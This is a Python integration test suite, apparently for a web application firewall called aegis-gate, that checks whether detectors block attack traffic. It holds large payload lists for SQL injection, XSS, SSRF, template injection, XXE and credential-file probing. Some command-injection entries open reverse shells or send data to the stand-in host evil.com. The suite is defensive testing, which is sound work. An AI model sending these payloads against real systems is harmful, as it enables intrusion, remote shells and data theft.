#!/usr/bin/env python3
"""
LT-RUN-6 Extended Integration Tests — aegis-gate (v2)
======================================================
200+ targeted test cases covering all 16 Run-6 audit findings.
Companion to lt_run6_live_tests.py — run both for full coverage.

Run:
    python3 tests/lt_run6_extended_tests.py [--data URL] [--admin URL] [-v]

ASSERTION-INVERSION CONVENTION (LT-RUN-7 TS-04, 2026-05-14)
----------------------------------------------------------
Like its companion, this suite encodes audit findings as
"confirmed bug" assertions: `R.record(fid, name, passed=True)`
means the EXPECTED BUGGY BEHAVIOUR was observed.  ✓ in the
output = bug present; ✗ = bug appears fixed (the desirable
post-fix signal).

INTENTIONAL OMISSIONS (LT-RUN-7 TS-09)
-------------------------------------
The following Run-6 findings are NOT covered by HTTP probes:
  - DLP-FPE (`dlp/fpe.rs` XOR-mod10 stub) — requires a
    controllable upstream returning PAN/SSN data.
  - SEC-19 (JA3 blake3 vs MD5)            — TLS-layer
    fingerprint, no admin endpoint exposes the computed value.
  - BASIC-01 (`auth/basic.rs` blake3 password hash) —
    `#[allow(dead_code)]` per PR #9, zero callers.

These omissions are correct; they would require infrastructure
changes (controllable upstream / new admin endpoint) before
becoming HTTP-testable.

Tests that are SKIPPED (TS-01, see body) reflect findings that
poll a code path the actual bug does not reach — kept in the
file as documentation that an HTTP test for that finding is
inherently false-negative.

Finding coverage:
  SEC-07  All 12 detectors disconnected — per-detector + encoding bypass tests
  SEC-16  Nonce race — SKIPPED (TS-01) — challenge_issue uses safe PoW path
  SEC-20  on_response_start PassThrough — ICAP never called
  EVAL-01 IpIn CIDR string-prefix bug — exhaustive subnet edge cases
  EVAL-02 RateLimit ignores key/limit — multiple configurations
  RL-01   IpRateLimiter not wired — flood never triggers IP bucket
  RISK-01 RiskTracker not wired — attacks never raise score
  DDOS-01 DdosDetector tick_rps never called — EWMA perpetually stale
  BOTS-01 BotClassifier trusts caller reverse_dns — UA spoofing
  GQL-01  GraphQL depth*wordcount — alias/fragment bypass
  THREAT-01 check_domain exact match only — subdomain bypass
  NOOP-01 NoopPipeline wiring check
  Various encoding bypass, smuggling, admin fuzzing, response headers
"""

import argparse
import json
import sys
import time
import threading
import urllib.request
import urllib.error
import urllib.parse
import ssl
import http.cookiejar
from dataclasses import dataclass, field
from typing import Optional, Any

# ── colour helpers ─────────────────────────────────────────────────────────────
RESET = "\033[0m"; BOLD = "\033[1m"
GREEN = "\033[32m"; RED = "\033[31m"; YELLOW = "\033[33m"; CYAN = "\033[36m"

def ok(msg):   print(f"  {GREEN}✓{RESET} {msg}")
def fail(msg): print(f"  {RED}✗{RESET} {msg}")
def warn(msg): print(f"  {YELLOW}⚠{RESET} {msg}")
def info(msg): print(f"  {CYAN}·{RESET} {msg}")
def hdr(msg):  print(f"\n{BOLD}{msg}{RESET}")
def sep():     print("  " + "─"*68)

# ── result tracker ─────────────────────────────────────────────────────────────
@dataclass
class Results:
    passed: int = 0
    failed: int = 0
    skipped: int = 0
    findings: dict = field(default_factory=dict)

    def record(self, fid, name, passed, note=""):
        self.findings.setdefault(fid, []).append((name, passed, note))
        if passed:
            self.passed += 1
            ok(f"[{fid}] {name}" + (f"  — {note}" if note else ""))
        else:
            self.failed += 1
            fail(f"[{fid}] {name}" + (f"  — {note}" if note else ""))

    def skip(self, fid, name, reason=""):
        self.skipped += 1
        warn(f"[{fid}] SKIP {name}" + (f"  — {reason}" if reason else ""))

    def summary(self):
        total = self.passed + self.failed
        hdr(f"══ SUMMARY ══  {self.passed}/{total} passed  ({self.skipped} skipped)")
        for fid in sorted(self.findings):
            cases = self.findings[fid]
            p = sum(1 for _, ok_, _ in cases if ok_)
            t = len(cases)
            color = GREEN if p == t else (YELLOW if p > 0 else RED)
            print(f"  {color}{fid:14s}{RESET}  {p}/{t}")
        if self.failed == 0:
            print(f"\n{GREEN}{BOLD}All assertions passed.{RESET}")
        else:
            print(f"\n{RED}{BOLD}{self.failed} assertion(s) failed.{RESET}")

R = Results()

# ── HTTP client ────────────────────────────────────────────────────────────────
class Client:
    def __init__(self, base, admin, verify_tls=True, verbose=False,
                 user="admin", password="aegis-test-1234"):
        self.base = base.rstrip("/")
        self.admin = admin.rstrip("/")
        self.verbose = verbose
        self.user = user
        self.password = password
        self.jar = http.cookiejar.CookieJar()
        ctx = ssl.create_default_context()
        if not verify_tls:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar),
            urllib.request.HTTPSHandler(context=ctx),
        )
        self.csrf = None

    def _req(self, url, method="GET", body=None, headers=None, timeout=8):
        data = None
        req_headers = {"Accept": "application/json"}
        if headers:
            req_headers.update(headers)
        if body is not None:
            if isinstance(body, (dict, list)):
                data = json.dumps(body).encode()
                req_headers["Content-Type"] = "application/json"
            elif isinstance(body, bytes):
                data = body
            else:
                data = str(body).encode()
        req = urllib.request.Request(url, data=data, method=method,
                                     headers=req_headers)
        try:
            with self.opener.open(req, timeout=timeout) as resp:
                raw = resp.read()
                if self.verbose:
                    info(f"{method} {url} → {resp.status}")
                return resp.status, raw, dict(resp.headers)
        except urllib.error.HTTPError as e:
            raw = e.read()
            if self.verbose:
                info(f"{method} {url} → {e.code}")
            return e.code, raw, dict(e.headers)
        except Exception as ex:
            if self.verbose:
                info(f"{method} {url} → ERR {ex}")
            return 0, b"", {}

    def get(self, path, headers=None):
        return self._req(self.base + path, headers=headers)
    def post(self, path, body=None, headers=None):
        return self._req(self.base + path, "POST", body, headers)
    def put(self, path, body=None, headers=None):
        return self._req(self.base + path, "PUT", body, headers)

    def _ah(self, extra=None):
        h = dict(extra or {})
        if self.csrf:
            h["X-CSRF-Token"] = self.csrf
        return h

    def aget(self, path, headers=None):
        return self._req(self.admin + path, headers=self._ah(headers))
    def apost(self, path, body=None, headers=None):
        return self._req(self.admin + path, "POST", body, self._ah(headers))
    def aput(self, path, body=None, headers=None):
        return self._req(self.admin + path, "PUT", body, self._ah(headers))
    def adelete(self, path, headers=None):
        return self._req(self.admin + path, "DELETE", headers=self._ah(headers))
    def apatch(self, path, body=None, headers=None):
        return self._req(self.admin + path, "PATCH", body, self._ah(headers))

    def login(self):
        s, _, _ = self._req(self.admin + "/admin/login", "POST",
                             {"user": self.user, "password": self.password})
        if s != 200:
            return False
        for cookie in self.jar:
            if cookie.name == "aegis_csrf":
                self.csrf = cookie.value
        return True

    def jb(self, raw):
        try:
            return json.loads(raw)
        except Exception:
            return None

    def clone(self):
        """Return a new client sharing the same config but fresh cookie jar."""
        c2 = Client(self.base, self.admin, True, self.verbose,
                    self.user, self.password)
        return c2


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 1: SEC-07 — per-detector exhaustive tests
# ═══════════════════════════════════════════════════════════════════════════════

# ── Detector-specific payloads ─────────────────────────────────────────────────
SQLI_PAYLOADS = [
    ("/q?id=1' OR '1'='1",                         "classic OR bypass"),
    ("/q?id=1 UNION SELECT NULL,NULL,NULL--",       "UNION 3-col"),
    ("/q?id=1; DROP TABLE users--",                 "stacked drop"),
    ("/q?id=1 AND SLEEP(5)--",                      "time-based blind"),
    ("/q?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "error-based"),
    ("/q?id=0x31 OR 0x31=0x31",                    "hex encoded"),
    ("/q?id=1/**/OR/**/1=1",                        "comment obfuscation"),
    ("/q?id=1%27+AND+%271%27%3D%271",              "URL-encoded quote"),
    ("/q?id=1'+AND+(SELECT 1 FROM information_schema.tables)--", "schema probe"),
    ("/q?id=1' AND BENCHMARK(5000000,MD5(1))--",   "benchmark blind"),
    ("/q?id=1' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--", "boolean blind"),
    ("/q?id=1;WAITFOR DELAY '0:0:5'--",            "MSSQL delay"),
    ("/q?id=1 AND pg_sleep(5)--",                   "PgSQL sleep"),
    ("/q?id=1'+UNION+ALL+SELECT+NULL,user(),NULL--","MySQL user()"),
    ("/q?id=1 UNION SELECT table_name FROM information_schema.tables--", "table enum"),
    ("/q?id=1; exec xp_cmdshell('whoami')--",      "MSSQL xp_cmdshell"),
    ("/q?id=' OR 1=1--",                            "simple bypass"),
    ("/q?id=\" OR \"\"=\"",                         "double-quote bypass"),
    ("/q?id=1' ORDER BY 9--",                       "column count"),
    ("/q?id=admin'--",                              "auth bypass"),
]

XSS_PAYLOADS = [
    ("/s?q=<script>alert(1)</script>",                   "basic script"),
    ("/s?q=<img src=x onerror=alert(1)>",                "img onerror"),
    ("/s?q=<svg onload=alert(1)>",                        "svg onload"),
    ("/s?q=javascript:alert(document.cookie)",            "JS URI"),
    ("/s?q=<body onload=alert(1)>",                       "body onload"),
    ("/s?q=<input autofocus onfocus=alert(1)>",           "onfocus"),
    ("/s?q=<details open ontoggle=alert(1)>",             "ontoggle"),
    ("/s?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",     "URL encoded"),
    ("/s?q=&#60;script&#62;alert(1)&#60;/script&#62;",   "HTML entity"),
    ("/s?q=<scr<script>ipt>alert(1)</scr</script>ipt>",  "nested split"),
    ("/s?q=<SCRIPT>alert(1)</SCRIPT>",                   "uppercase"),
    ("/s?q=<script/src=//evil.com/x.js>",                 "remote script"),
    ("/s?q=<iframe src=javascript:alert(1)>",             "iframe JS"),
    ("/s?q=<object data=javascript:alert(1)>",            "object data"),
    ("/s?q=data:text/html,<script>alert(1)</script>",     "data URI html"),
    ("/s?q=<math><mi xlink:href=javascript:alert(1)>",    "SVG/MathML"),
    ("/s?q=vbscript:msgbox(1)",                           "vbscript"),
    ("/s?q=<a href=\"javascript:void(0)\" onclick=alert(1)>click</a>", "onclick"),
    ("/s?q=<form action=javascript:alert(1)><input type=submit>",      "form action"),
    ("/s?q=<button formaction=javascript:alert(1)>",                   "formaction"),
]

PATH_TRAVERSAL_PAYLOADS = [
    ("/f?p=../../etc/passwd",              "basic ../"),
    ("/f?p=../../../etc/shadow",           "deep ../"),
    ("/f?p=%2E%2E%2F%2E%2E%2Fetc%2Fpasswd", "URL encoded"),
    ("/f?p=....//....//etc/passwd",        "double dot-slash"),
    ("/f?p=..\\..\\windows\\system32",     "Windows backslash"),
    ("/f?p=%C0%AF%C0%AFetc/passwd",        "overlong UTF-8"),
    ("/f?p=..%2F..%2Fetc%2Fpasswd",        "mixed encoding"),
    ("/f?p=..%252F..%252Fetc%252Fpasswd",  "double URL encode"),
    ("/f?p=/etc/passwd",                   "absolute path"),
    ("/f?p=....%2F....%2Fetc%2Fpasswd",   "4-dot encoded"),
    ("/f?p=..%c0%af..%c0%afetc/passwd",   "UTF-8 slash"),
    ("/f?p=/%2e%2e/%2e%2e/etc/passwd",     "encoded each segment"),
    ("/f?p=..%00.jpg",                     "null-byte suffix"),
    ("/f?p=php://filter/read=convert.base64-encode/resource=/etc/passwd", "PHP filter"),
    ("/f?p=/proc/self/environ",            "proc environ"),
]

SSRF_PAYLOADS = [
    ("/p?url=http://localhost/admin",               "localhost"),
    ("/p?url=http://127.0.0.1/",                    "127.0.0.1"),
    ("/p?url=http://0.0.0.0/",                      "0.0.0.0"),
    ("/p?url=http://[::1]/",                        "IPv6 loopback"),
    ("/p?url=http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ("/p?url=http://metadata.google.internal/",     "GCP metadata"),
    ("/p?url=http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
    ("/p?url=http://192.168.1.1/",                  "RFC1918 192.168/16"),
    ("/p?url=http://10.0.0.1/",                     "RFC1918 10/8"),
    ("/p?url=http://172.16.0.1/",                   "RFC1918 172.16/12"),
    ("/p?url=http://[::ffff:127.0.0.1]/secret",     "IPv4-mapped IPv6"),
    ("/p?url=http://[::ffff:169.254.169.254]/",     "IPv4-mapped IMDS"),
    ("/p?url=file:///etc/passwd",                   "file protocol"),
    ("/p?url=gopher://127.0.0.1:6379/_FLUSHALL",   "gopher Redis"),
    ("/p?url=dict://127.0.0.1:11211/stats",         "dict memcache"),
    ("/p?url=ftp://127.0.0.1/etc/passwd",           "FTP"),
    ("/p?url=http://2130706433/",                   "decimal IP (127.0.0.1)"),
    ("/p?url=http://0x7f000001/",                   "hex IP"),
    ("/p?url=http://017700000001/",                 "octal IP"),
    ("/p?url=https://evil.com:80@169.254.169.254/", "userinfo bypass"),
    ("/p?url=http://169.254.169.254.evil.com/",     "DNS bypass"),
    ("/p?url=http://evil.com#169.254.169.254",      "fragment bypass"),
]

CMD_INJECTION_PAYLOADS = [
    ("/e?c=ls;cat /etc/passwd",          "semicolon"),
    ("/e?c=ls|id",                        "pipe"),
    ("/e?c=ls||id",                       "OR operator"),
    ("/e?c=ls&&cat /etc/shadow",          "AND operator"),
    ("/e?c=`id`",                         "backtick"),
    ("/e?c=$(id)",                        "dollar-paren"),
    ("/e?c=${IFS}id",                     "IFS whitespace"),
    ("/e?c=ls%0aid",                      "newline separator"),
    ("/e?c=ls%0did",                      "CR separator"),
    ("/e?c=ping -c 1 $(id)",              "cmd substitution arg"),
    ("/e?c=curl http://evil.com/$(whoami)","curl exfil"),
    ("/e?c=id > /tmp/pwned",              "redirect"),
    ("/e?c=nc -e /bin/sh evil.com 4444",  "netcat shell"),
    ("/e?c=python -c 'import os;os.system(\"id\")'", "python exec"),
    ("/e?c=bash -i >& /dev/tcp/evil.com/4444 0>&1",  "bash reverse shell"),
]

SSTI_PAYLOADS = [
    ("/t?t={{7*7}}",                             "Jinja2 math"),
    ("/t?t={{7*'7'}}",                           "Jinja2 string mul"),
    ("/t?t={{config}}",                          "Jinja2 config dump"),
    ("/t?t={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "Jinja2 RCE"),
    ("/t?t=${7*7}",                              "FreeMarker/Groovy"),
    ("/t?t=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "FreeMarker exec"),
    ("/t?t=<%= 7*7 %>",                          "ERB Ruby"),
    ("/t?t=<%= `id` %>",                         "ERB backtick"),
    ("/t?t=@(7*7)",                              "Razor C#"),
    ("/t?t=#{7*7}",                              "Ruby string interp"),
    ("/t?t=*{7*7}",                              "Spring SpEL"),
    ("/t?t=*{T(java.lang.Runtime).getRuntime().exec('id')}", "SpEL exec"),
    ("/t?t={{_self.env.registerUndefinedFilterCallback('exec')}}", "Twig"),
    ("/t?t={php}echo `id`;{/php}",              "Smarty PHP"),
    ("/t?t={{7|multiply:7}}",                   "Twig filter math"),
]

NOSQLI_PAYLOADS = [
    ("/api/users?filter[$ne]=1",                  "$ne bypass"),
    ("/api/users?filter[$gt]=",                   "$gt empty"),
    ("/api/users?filter[$lt]=zzz",                "$lt string"),
    ("/api/users?filter[$gte]=0",                 "$gte zero"),
    ("/api/users?filter[$regex]=.*",              "$regex wildcard"),
    ("/api/users?filter[$regex]=^admin",          "$regex prefix"),
    ("/api/users?where=function(){return true}",  "$where true func"),
    ("/api/users?where=function(){sleep(5)}",     "$where sleep"),
    ("/api/data?$query={}",                       "bare $query"),
    ("/api/data?$comment=hack",                   "$comment inject"),
    ("/api/users?username[$ne]=none",             "username $ne"),
    ("/api/users?password[$exists]=true",         "$exists probe"),
    ("/api/users?$or=[{\"admin\":true}]",         "$or admin"),
    ("/api/data?$lookup[from]=admin",             "$lookup bypass"),
    ("/api/data?$merge[into]=users",              "$merge into"),
]

OPEN_REDIRECT_PAYLOADS = [
    ("/redir?to=//evil.com",               "protocol-relative"),
    ("/redir?to=https://evil.com",         "absolute HTTPS"),
    ("/redir?to=http://evil.com",          "absolute HTTP"),
    ("/redir?to=\\\\evil.com",             "backslash prefix"),
    ("/redir?to=/\\evil.com",              "mixed slash"),
    ("/redir?to=javascript:location='//evil.com'", "JS redirect"),
    ("/redir?to=///evil.com",              "triple slash"),
    ("/redir?to=%2F%2Fevil.com",           "URL encoded //"),
    ("/redir?to=%5C%5Cevil.com",           "URL encoded \\\\"),
    ("/redir?to=http:evil.com",            "colon no-slash"),
    ("/redir?to=https%3A//evil.com",       "scheme encoded"),
    ("/redir?to=/redirect?url=//evil.com", "chained redirect"),
]

HEADER_INJECTION_PAYLOADS = [
    ("/api?x=foo%0d%0aSet-Cookie:+evil=1",           "CRLF cookie inject (URL encoded)"),
    ("/api?x=foo%0aSet-Cookie:+evil=1",              "LF-only cookie inject"),
    ("/api?x=foo\r\nSet-Cookie: evil=1",             "CRLF raw"),
    ("/api?x=foo%0d%0aX-Injected:+yes",              "CRLF custom header"),
    ("/api?x=foo%E5%98%8D%E5%98%8ASet-Cookie:+evil=1", "unicode CRLF (U+560D/560A)"),
    ("/api?x=test%0d%0a%0d%0a<script>alert(1)</script>", "CRLF + XSS body split"),
]

RECON_PAYLOADS = [
    ("/.env",                               ".env file"),
    ("/.env.local",                         ".env.local"),
    ("/.env.production",                    ".env.production"),
    ("/.env.backup",                        ".env.backup"),
    ("/.git/HEAD",                          ".git HEAD"),
    ("/.git/config",                        ".git config"),
    ("/.git/COMMIT_EDITMSG",               ".git commit msg"),
    ("/.svn/entries",                       ".svn entries"),
    ("/.DS_Store",                          "macOS DS_Store"),
    ("/.htaccess",                          ".htaccess"),
    ("/.htpasswd",                          ".htpasswd"),
    ("/wp-config.php",                      "WordPress config"),
    ("/wp-login.php",                       "WordPress login"),
    ("/phpinfo.php",                        "PHPInfo"),
    ("/info.php",                           "info.php"),
    ("/config.php",                         "config.php"),
    ("/database.php",                       "database.php"),
    ("/backup.sql",                         "backup.sql"),
    ("/dump.sql",                           "dump.sql"),
    ("/db.sql",                             "db.sql"),
    ("/backup.tar.gz",                      "backup tarball"),
    ("/backup.zip",                         "backup zip"),
    ("/v1.24/containers/json",              "Docker API v1.24"),
    ("/v1.41/containers/json",              "Docker API v1.41"),
    ("/v1.41/images/json",                  "Docker images list"),
    ("/v1.41/info",                         "Docker info"),
    ("/actuator",                           "Spring actuator root"),
    ("/actuator/env",                       "Spring actuator env"),
    ("/actuator/heapdump",                  "Spring heapdump"),
    ("/actuator/mappings",                  "Spring mappings"),
    ("/actuator/shutdown",                  "Spring shutdown"),
    ("/actuator/beans",                     "Spring beans"),
    ("/script",                             "Jenkins /script"),
    ("/jenkins/script",                     "Jenkins nested"),
    ("/job/test/build",                     "Jenkins build"),
    ("/app/kibana",                         "Kibana 7"),
    ("/app/home",                           "Kibana 8 home"),
    ("/_cat/indices",                       "Elasticsearch cat"),
    ("/_cluster/health",                    "Elasticsearch cluster"),
    ("/_nodes",                             "Elasticsearch nodes"),
    ("/api/v1/pods",                        "k8s pods"),
    ("/api/v1/secrets",                     "k8s secrets"),
    ("/api/v1/namespaces",                  "k8s namespaces"),
    ("/swagger-ui.html",                    "Swagger UI"),
    ("/swagger-ui/index.html",              "Swagger UI v3"),
    ("/api-docs",                           "OpenAPI docs"),
    ("/v2/api-docs",                        "Springfox API docs"),
    ("/.aws/credentials",                   "AWS credentials"),
    ("/.ssh/id_rsa",                        "SSH private key"),
    ("/.ssh/authorized_keys",               "SSH authorized_keys"),
    ("/etc/passwd",                         "Unix passwd"),
    ("/server-status",                      "Apache server-status"),
    ("/server-info",                        "Apache server-info"),
    ("/_ignition/execute-solution",         "Laravel CVE-2021-3129"),
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "PHPUnit eval"),
    ("/graphql",                            "GraphQL endpoint probe"),
    ("/graphiql",                           "GraphiQL IDE"),
    ("/console",                            "H2/Play console"),
    ("/trace",                              "Spring trace"),
    ("/jolokia",                            "Jolokia JMX"),
    ("/jmx-console",                        "JBoss JMX console"),
    ("/manager/html",                       "Tomcat manager"),
    ("/phpmyadmin",                         "phpMyAdmin"),
    ("/adminer.php",                        "Adminer"),
    ("/redis",                              "Redis web"),
    ("/memcache",                           "Memcache web"),
    ("/test.php",                           "test.php"),
    ("/shell.php",                          "shell.php"),
    ("/cmd.php",                            "cmd.php"),
    ("/webshell.php",                       "webshell.php"),
]

BODY_ABUSE_PAYLOADS = [
    # (label, path, content_type, body_func)
    ("SQLi in JSON body", "/api/login",  "application/json",
     json.dumps({"username": "admin' OR '1'='1--", "password": "x"}).encode()),
    ("XSS in JSON body",  "/api/comment","application/json",
     json.dumps({"text": "<script>alert(document.cookie)</script>"}).encode()),
    ("SSTI in JSON body", "/api/render", "application/json",
     json.dumps({"template": "{{7*7}}"}).encode()),
    ("Path traversal in JSON", "/api/file", "application/json",
     json.dumps({"path": "../../etc/passwd"}).encode()),
    ("SSRF in JSON body", "/api/fetch",  "application/json",
     json.dumps({"url": "http://169.254.169.254/latest/meta-data/"}).encode()),
    ("SQLi in XML body",  "/api/query",  "application/xml",
     b"<query><id>1' OR '1'='1--</id></query>"),
    ("XXE in XML body",   "/api/data",   "application/xml",
     b"""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"""),
    ("SQLi in form body", "/api/search", "application/x-www-form-urlencoded",
     b"q=1%27+OR+%271%27%3D%271&submit=1"),
    ("XSS in form body",  "/api/post",   "application/x-www-form-urlencoded",
     b"content=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
    ("CmdInj in form",    "/api/exec",   "application/x-www-form-urlencoded",
     b"cmd=ls%3Bcat+%2Fetc%2Fpasswd"),
]


def test_sec07_sqli_detector(c: Client):
    hdr("SEC-07/SQLi: 20 SQL injection variants — all should pass (detectors disconnected)")
    sep()
    blocked = 0
    for path, label in SQLI_PAYLOADS:
        s, _, _ = c.get(path)
        passed = s in (200, 502, 404, 301, 302)
        if s in (403, 406):
            blocked += 1
        R.record("SEC-07/SQLi", label, passed, f"HTTP {s}")
    info(f"  SQLi: {len(SQLI_PAYLOADS)-blocked}/{len(SQLI_PAYLOADS)} passed through unblocked")


def test_sec07_xss_detector(c: Client):
    hdr("SEC-07/XSS: 20 XSS variants — all should pass (detectors disconnected)")
    sep()
    blocked = 0
    for path, label in XSS_PAYLOADS:
        s, _, _ = c.get(path)
        passed = s in (200, 502, 404, 301, 302)
        if s in (403, 406):
            blocked += 1
        R.record("SEC-07/XSS", label, passed, f"HTTP {s}")
    info(f"  XSS: {len(XSS_PAYLOADS)-blocked}/{len(XSS_PAYLOADS)} passed through unblocked")


def test_sec07_path_traversal_detector(c: Client):
    hdr("SEC-07/PathTraversal: 15 traversal variants")
    sep()
    for path, label in PATH_TRAVERSAL_PAYLOADS:
        s, _, _ = c.get(path)
        R.record("SEC-07/PathTraversal", label, s in (200, 502, 404, 301, 302), f"HTTP {s}")


def test_sec07_ssrf_detector(c: Client):
    hdr("SEC-07/SSRF: 22 SSRF variants including IPv4-mapped, decimal/hex IP")
    sep()
    for path, label in SSRF_PAYLOADS:
        s, _, _ = c.get(path)
        R.record("SEC-07/SSRF", label, s in (200, 502, 404, 301, 302), f"HTTP {s}")


def test_sec07_cmdinj_detector(c: Client):
    hdr("SEC-07/CmdInj: 15 command injection variants")
    sep()
    for path, label in CMD_INJECTION_PAYLOADS:
        s, _, _ = c.get(path)
        R.record("SEC-07/CmdInj", label, s in (200, 502, 404, 301, 302), f"HTTP {s}")


def test_sec07_ssti_detector(c: Client):
    hdr("SEC-07/SSTI: 15 template injection variants — Jinja2, FreeMarker, ERB, SpEL")
    sep()
    for path, label in SSTI_PAYLOADS:
        s, _, _ = c.get(path)
        R.record("SEC-07/SSTI", label, s in (200, 502, 404, 301, 302), f"HTTP {s}")


def test_sec07_nosqli_detector(c: Client):
    hdr("SEC-07/NoSQLi: 15 MongoDB operator injection variants")
    sep()
    for path, label in NOSQLI_PAYLOADS:
        s, _, _ = c.get(path)
        R.record("SEC-07/NoSQLi", label, s in (200, 502, 404, 301, 302), f"HTTP {s}")


def test_sec07_open_redirect_detector(c: Client):
    hdr("SEC-07/OpenRedirect: 12 redirect bypass patterns")
    sep()
    for path, label in OPEN_REDIRECT_PAYLOADS:
        s, _, _ = c.get(path)
        R.record("SEC-07/OpenRedirect", label, s in (200, 502, 404, 301, 302), f"HTTP {s}")


def test_sec07_header_injection_detector(c: Client):
    hdr("SEC-07/HeaderInj: CRLF and unicode newline header injection")
    sep()
    for path, label in HEADER_INJECTION_PAYLOADS:
        s, _, _ = c.get(path)
        R.record("SEC-07/HeaderInj", label, s in (200, 502, 404, 301, 302), f"HTTP {s}")


def test_sec07_recon_detector(c: Client):
    hdr("SEC-07/Recon: 70+ reconnaissance probe paths")
    sep()
    blocked = 0
    for path, label in RECON_PAYLOADS:
        s, _, _ = c.get(path)
        passed = s in (200, 404, 502, 301, 302)  # any non-block is passing
        if s in (403, 406):
            blocked += 1
        R.record("SEC-07/Recon", label, passed, f"HTTP {s}")
    info(f"  Recon: {len(RECON_PAYLOADS)-blocked}/{len(RECON_PAYLOADS)} paths unblocked")


def test_sec07_recon_user_agents(c: Client):
    hdr("SEC-07/Recon-UA: Scanner User-Agent strings — should be blocked by BruteForce/Recon")
    sep()
    scanner_uas = [
        ("Nikto/2.1.6",                  "Nikto"),
        ("sqlmap/1.5#stable (https://sqlmap.org)", "sqlmap"),
        ("gobuster/3.1.0",               "gobuster"),
        ("dirb/2.22",                    "dirb"),
        ("dirbuster/1.0-RC1",            "DirBuster"),
        ("wfuzz/3.1.0",                  "wfuzz"),
        ("hydra",                         "Hydra"),
        ("nmap scripting engine",         "nmap NSE"),
        ("masscan/1.3.2",                 "masscan"),
        ("zgrab/0.x",                     "zgrab"),
        ("python-requests/2.28",          "python-requests (generic)"),
        ("curl/7.68.0",                   "curl (may be legit)"),
        ("WPScan v3.8.22",               "WPScan"),
        ("Acunetix-PHP-Scanner",          "Acunetix"),
        ("Mozilla/5.0 (compatible; Googlebot/2.1)", "Googlebot UA"),
    ]
    for ua, label in scanner_uas:
        s, _, _ = c.get("/api/probe", headers={"User-Agent": ua})
        R.record("SEC-07/Recon-UA", f"scanner UA passes: {label}",
                 s in (200, 502, 404, 301, 302), f"HTTP {s} UA={ua[:30]}")


def test_sec07_body_attack_payloads(c: Client):
    hdr("SEC-07/BodyAbuse: attacks in POST body (body detector also disconnected)")
    sep()
    for label, path, ctype, body in BODY_ABUSE_PAYLOADS:
        s, _, _ = c.post(path, body, {"Content-Type": ctype})
        R.record("SEC-07/BodyAbuse", label, s in (200, 502, 404, 400, 415),
                 f"HTTP {s}")


# ═══════════════════════════════════════════════════════════════════════════════
#  PART 2: EVAL-01 — CIDR IpIn exhaustive edge cases
# ═══════════════════════════════════════════════════════════════════════════════

def _create_rule(c: Client, rule_id, when_clause, action_clause, priority=1):
    """Helper: create a rule, return (success, created_id)."""
    rule = {
        "id": rule_id, "priority": priority, "enabled": True,
        "description": f"LT-RUN-6 test rule {rule_id}",
        "when": when_clause,
        "then": action_clause,
    }
    s, body, _ = c.apost("/api/rules", rule)
    return s in (200, 201, 204), rule_id

def _delete_rule(c: Client, rule_id):
    c.adelete(f"/api/rules/{rule_id}")
    time.sleep(0.15)

def test_eval01_cidr_exhaustive(c: Client):
    hdr("EVAL-01: Exhaustive CIDR IpIn edge cases — 127.0.0.0/8 vs host addresses")
    sep()

    test_cases = [
        # (rule_cidr, expected_blocked, description)
        # BUG: starts_with("127.0.0.1", "127.0.0.0") = False → never blocked
        ("127.0.0.0/8",  False, "/8 — 127.0.0.1 not in '127.0.0.0' prefix"),
        ("127.0.0.0/16", False, "/16 — 127.0.0.1 not in '127.0.0' prefix"),
        ("127.0.0.0/24", False, "/24 — 127.0.0.1 not in '127.0.0.0' prefix"),
        # Only the exact network address matches via starts_with
        ("127.0.0.1/32", True,  "/32 — exact match 127.0.0.1 == '127.0.0.1'"),
        # /8 of a different space
        ("10.0.0.0/8",   False, "/8 — 127.x.x.x not in 10/8"),
    ]

    for cidr, expect_block, desc in test_cases:
        rid = f"lt-eval01-{cidr.replace('/', '-').replace('.', '_')}"
        ok_created, _ = _create_rule(c, rid,
            {"ip_in": [cidr]}, {"block": {"status": 403}})
        if not ok_created:
            R.skip("EVAL-01", f"CIDR {cidr} rule create failed", "")
            continue
        time.sleep(0.25)
        s, _, _ = c.get("/")
        blocked = (s == 403)
        # The test PASSES if observed behaviour matches expected (buggy) behaviour
        bug_confirmed = (not blocked) and (not expect_block)
        fix_detected  = blocked and expect_block
        if expect_block:
            R.record("EVAL-01", f"CIDR {cidr}: {desc}",
                     blocked, f"HTTP {s} — {'BLOCKED ✓' if blocked else 'NOT BLOCKED (bug?)'}")
        else:
            R.record("EVAL-01", f"CIDR {cidr} does NOT match (bug present): {desc}",
                     not blocked, f"HTTP {s} — {'confirmed bug' if not blocked else 'UNEXPECTEDLY BLOCKED'}")
        _delete_rule(c, rid)


def test_eval01_cidr_boundary_hosts(c: Client):
    hdr("EVAL-01: CIDR boundary — network addr, broadcast, first host, last host")
    sep()
    # Using 127.0.0.0/29 as example (hosts: 127.0.0.1 – 127.0.0.6, bcast: .7)
    # Our client is 127.0.0.1 — should be within /29
    rid = "lt-eval01-slash29"
    ok_created, _ = _create_rule(c, rid,
        {"ip_in": ["127.0.0.0/29"]}, {"block": {"status": 403}})
    if not ok_created:
        R.skip("EVAL-01", "/29 boundary test", "rule create failed")
        return
    time.sleep(0.25)
    s, _, _ = c.get("/")
    # bug: starts_with("127.0.0.1", "127.0.0.0") = False → pass through
    R.record("EVAL-01", "127.0.0.1 NOT matched by 127.0.0.0/29 (CIDR bug confirmed)",
             s in (200, 502), f"HTTP {s}")
    _delete_rule(c, rid)


def test_eval01_ipv6_cidr(c: Client):
    hdr("EVAL-01: IPv6 CIDR matching — ::1/128 and ::1/0")
    sep()
    # ::1/128 is exact loopback — if client is IPv6, this should match
    rid = "lt-eval01-ipv6"
    ok_created, _ = _create_rule(c, rid,
        {"ip_in": ["::1/128"]}, {"block": {"status": 403}})
    if not ok_created:
        R.skip("EVAL-01", "IPv6 CIDR test", "rule create failed")
        return
    time.sleep(0.25)
    s, _, _ = c.get("/")
    # Document whatever we observe
